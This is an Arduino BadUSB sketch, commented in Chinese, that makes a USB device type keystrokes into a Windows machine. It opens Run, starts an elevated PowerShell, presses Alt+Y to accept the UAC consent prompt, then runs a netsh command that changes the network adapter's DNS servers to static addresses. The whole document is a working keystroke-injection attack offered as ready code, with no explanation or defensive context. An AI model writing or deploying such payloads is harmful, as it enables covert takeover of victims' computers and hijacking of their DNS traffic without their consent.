void setup(){
  Keyboard.begin();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("powershell.exe -c start-process powershell -verb runAs");
  Keyboard.println();
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print('y');
  Keyboard.release(KEY_LEFT_ALT);
  delay(500);
  Keyboard.println("cmd");
  delay(50);
  Keyboard.println("netsh interface ip set dns \"Local Area Connection\" static 127.0.0.1-192.168.1.1&&exit");
  Keyboard.end();
}

void loop(){
}
